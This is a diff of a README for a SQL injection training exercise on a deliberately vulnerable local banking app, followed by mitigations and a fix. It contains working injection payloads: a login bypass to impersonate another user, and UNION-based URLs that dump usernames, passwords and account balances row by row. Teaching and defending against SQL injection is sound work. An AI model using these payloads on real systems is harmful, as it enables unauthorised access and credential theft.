@@ -1,12 +1,17 @@
 # Exercise 3 - SQL injection
-Exercise to help you understand SQL injection and its mitigations
+Exercise to help you understand SQL injection and its mitigation
+
+## Setup and Start Applications
 
 ## Setup and Start Applications
 
 1. check out exercise3 
-   * from command line: 'git checkout exercise3'
+   * choose branch 'exercise3' in the 'VCS -> Git -> Branches' menu within IntelliJ
 1. start the v-bank-app in debug mode
-   * with maven command:'mvn clean spring-boot:run -f ./v-bank-app/pom.xml'
+   * start the Maven configuration for the "v-bank-app" in DEBUG mode (with the green BUG icon next to the arrow)
+   (you should have created it as described in point __2.2. of the Workspace Setup Instructions__ at https://github.com/vargadan/v-bank/blob/master/README.md)
+\
+(the attacker application is not needed in this exercise)   
 
 ## Look for SQLi vulnerabilities
 Hints:
@@ -20,10 +25,10 @@ Hints:
 `connection.createStatement().executeQuery("SELECT * FROM ACCOUNT ACC WHERE ACC.USERNAME  = '" + userName + "'")`
 
 Present vulnerabilities:
-* In the *JDBCUserDetailsService* class that is responsible for loading the UserDetails upon authentication
-* In the *JDBCAccountService* class that is an implementation of the *AccountService* utilizing the JDBC API directly
+* In the *JDBCUserDetailsService* class that loads the UserDetails upon authentication
+* In the *JDBCAccountService* class that is an implementation of the *AccountService* coded against the JDBC API directly
 
-## Exploit to understand
+## Exploit to understand how SQLi works
 * The SQL in the JDBCUserDetailsService class is `"SELECT USERNAME, PASSWORD FROM USER U WHERE U.USERNAME = '" + uname + "'"`.
   This should be tweaked so to return USERNAME, PASSWORD pair with a known password:
 `SELECT USERNAME, PASSWORD FROM USER U WHERE U.USERNAME = '' AND SELECT 'bob','password' --'`
@@ -32,20 +37,27 @@ using below input on login page:
   * password: x
   This makes the code return a UserDetails object with the username (bob) and password (x) values set in the injected SQL snippet.
   Exploiting this SQLi vulnerability in the authentication component Alice could easily log in as Bob.
-* The home page is calling a REST service at http://vbank.0.0.0.0.xip.io:8080/api/v1/account/ACCOUNT_NO where ACCOUNT_NO URL fragment is taken as the parameter of the SQL query selecting user details. This parameter is SQL injectable (due to *JDBCAccountService* class). 
-  * we check if we can do UNION select on this parameter, injecting 4 additional result columns with an UNION injection into the original query: > http://vbank.0.0.0.0.xip.io:8080/api/v1/account/' UNION SELECT '1', '2','3','4' -- 
-  * as this works we can use it to exfiltrate user credentials: > http://vbank.0.0.0.0.xip.io:8080/api/v1/account/' UNION SELECT USERNAME, PASSWORD, '3', '4' FROM USER --
-  * since it returns only one row we have to iterate over the USER table: http://vbank.0.0.0.0.xip.io:8080/api/v1/account/' UNION SELECT USERNAME, PASSWORD,'3','4' FROM (SELECT ROWNUM() as ROW_NUM, USERNAME, PASSWORD FROM USER) WHERE ROW_NUM=1 --
+* The transaction history page is also vulnerable to SQLi 
+  * http://vbank.127.0.0.1.xip.io:8080/history?accountNo=ACCOUNT_NO and the ACCOUNT_NO parameter can be used for injection 
+  * By requesting http://vbank.127.0.0.1.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%272%27,%273%27,%274%27,%275%27,%276%27,%277%27%20--
+    \
+    you can see the the injected SQL query has to return 7 columns, of which 6 is displayed and the 7th must be a boolean (0 or 1 in SQL), so you cannot use it to exfiltrate.
+  * With the below link you can exfiltrate all account details from the e-bank:
+    * http://vbank.127.0.0.1.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%20ACCOUNT_ID,%20USERNAME,%20BALANCE,%20CURRENCY,%20%27X%27,%20%270%27%20%20FROM%20ACCOUNT%20--
+    * it merges the result of the "SELECT 1, ACCOUNT_ID, USERNAME, BALANCE, CURRENCY, 'X', 0 FROM ACCOUNT" query with the transaction history query and displays them
+* Furthermore, the home page is calling a REST service at http://vbank.127.0.0.1.xip.io:8080/api/v1/account/ACCOUNT_NO where ACCOUNT_NO URL fragment is taken as the parameter of the SQL query selecting user details. This parameter is SQL injectable (due to *JDBCAccountService* class). 
+  * we check if we can do UNION select on this parameter, injecting 4 additional result columns with an UNION injection into the original query: > http://vbank.127.0.0.1.xip.io:8080/api/v1/account/' UNION SELECT '1', '2','3','4' -- 
+  * as this works we can use it to exfiltrate user credentials: > http://vbank.127.0.0.1.xip.io:8080/api/v1/account/' UNION SELECT USERNAME, PASSWORD, '3', '4' FROM USER --
+  * since it returns only one row we have to iterate over the USER table: http://vbank.127.0.0.1.xip.io:8080/api/v1/account/' UNION SELECT USERNAME, PASSWORD,'3','4' FROM (SELECT ROWNUM() as ROW_NUM, USERNAME, PASSWORD FROM USER) WHERE ROW_NUM=1 --
   * increment ROW_NUM till it reaches the end of the USER table.
 
-## Task
-Use the transaction history page to exfiltrate data with SQL injection: http://vbank.0.0.0.0.xip.io:8080/history?accountNo=ACCOUNT_NO (where account no is the SQL injectable parameter).
-* Hint: http://vbank.0.0.0.0.xip.io:8080/history?accountNo=%27%20UNION%20SELECT%20%271%27,%272%27,%273%27,%274%27,%275%27,%276%27,%277%27%20--
-
 ## Mitigations
-* use a parameterized API such as prepared statements 
-* use an ORM (object-relational-mapping) tool for database operations (JPA: Java Persistence Api)
-* validate/sanitize/escape user input
+* use a parameterized interface / API to the database 
+  * prepared statements; a parameterized API escapes all parameters when building the SQL query in the lower layers
+  * use an ORM (object-relational-mapping) tool for database operations (JPA: Java Persistence API) this will use prepared statements in the background and make sure your data is escaped before passing it on
+* validate user input with strict enough rules so that a value with SQL injection can not be valid and is rejected on validation
+* SQL escape you data explicitly if you cannot use a parameterized API (prepared statements or an ORM tool)
+  * you better never had to do it.
 
 ## Fix
 1. Replace standard JDBC statements with prepared statements in *JDBCUserDetailsService* and *JDBCAccountService* 
@@ -133,7 +145,15 @@ public class JPAAccountService implements AccountService {
 }
 ```
 
-More on SQL injection prevention:
-https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
+You may see the solution in the __exercise3-solution__ branch at https://github.com/vargadan/v-bank/tree/exercise3-solution
 
-You may see the solution at https://github.com/vargadan/v-bank/tree/exercise3-solution
+The relevant changes are:
+* SQL queries executed with prepared statements in:
+  * the JDBCAccountService class in file *JDBCAccountService.java*
+  * the JDBCUserDetailsService class in file *JDBCUserDetailsService.java*
+* A new Java Persistence API (JPA which is the standard Java Object-Relational-Mapping tool) based implementation of the AccountService interface.
+  * JPAAccountService class in file *JPAAccountService.java*
+  * it should replace _JDBCAccountService_ as the default implementation of _AccountService_
+
+You can finde more information on SQL injection prevention at:
+https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.md
